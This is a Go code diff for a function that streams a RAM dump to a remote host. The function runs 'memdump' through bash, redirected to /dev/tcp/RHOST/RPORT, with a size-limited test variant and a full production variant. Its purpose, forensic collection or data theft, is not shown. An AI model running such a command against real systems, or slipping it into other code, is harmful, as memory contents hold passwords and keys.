@@ -8,6 +8,7 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"time"
 )
 
 type Message struct {
@@ -47,16 +48,15 @@ func getIP() string {
 func sendRam(RHOST string, RPORT string) {
 	fmt.Println("[+] Sending RAM dump.")
 
+	// Sleep for 1 second to give time to the server to be ready
+	time.Sleep(1 * time.Second)
+
 	// Prepare command
-	// FOR TESTS O N L Y
-	cmd := fmt.Sprintf("memdump -s 409600 > /dev/tcp/%s/%s", RHOST, RPORT)
+	cmd := exec.Command("/bin/bash", "-c", fmt.Sprintf("memdump -s 409600 > /dev/tcp/%s/%s", RHOST, RPORT)) // Used for tests
+	// cmd := exec.Command("/bin/bash", "-c", fmt.Sprintf("memdump > /dev/tcp/%s/%s", RHOST, RPORT)) // Used in production
 
-	// ACTUAL COMMAND ! ! !
-	//cmd := fmt.Sprintf("memdump > /dev/tcp/%s/%s", RHOST, RPORT)
-
-	// Run command with shell
-	err := exec.Command("bash", "-c", cmd).Run()
-
+	// Execute command
+	err := cmd.Run()
 	if err != nil {
 		log.Fatal(err)
 	}
